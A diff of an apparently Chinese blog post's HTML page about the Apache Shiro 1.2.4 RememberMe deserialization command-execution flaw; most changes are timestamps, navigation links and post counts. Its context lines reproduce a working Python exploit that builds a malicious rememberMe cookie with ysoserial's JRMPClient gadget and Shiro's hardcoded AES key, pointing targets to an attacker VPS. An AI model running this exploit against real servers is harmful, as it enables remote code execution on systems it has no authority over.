@@ -93,7 +93,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e6489726cd849800.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-ce89392389ffe8af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-d72d301e3e53871b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-08-02T06:21:42.273Z">
+<meta property="og:updated_time" content="2019-08-02T06:50:47.446Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Shiro RememberMe 1.2.4 反序列化过程命令执行漏洞">
 <meta name="twitter:description" content="影响版本Apache Shiro &amp;lt;= 1.2.4 产生原因shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 payload 构造前16字节的密钥–&amp;gt;">
@@ -388,7 +388,7 @@
 <li>shiro.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>使用大佬脚本生成 payload</p>
+<p>使用大佬脚本生成 payload(<code>ysoserial.jar</code>文件和运行目录处于同一目录)</p>
 <blockquote>
 <p>python shiro.py vpsip:1099</p>
 </blockquote>
@@ -462,6 +462,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/23/网络代理入门了解/" rel="prev" title="网络代理入门了解">
+                网络代理入门了解 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -538,7 +542,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-count">61</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -549,7 +553,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
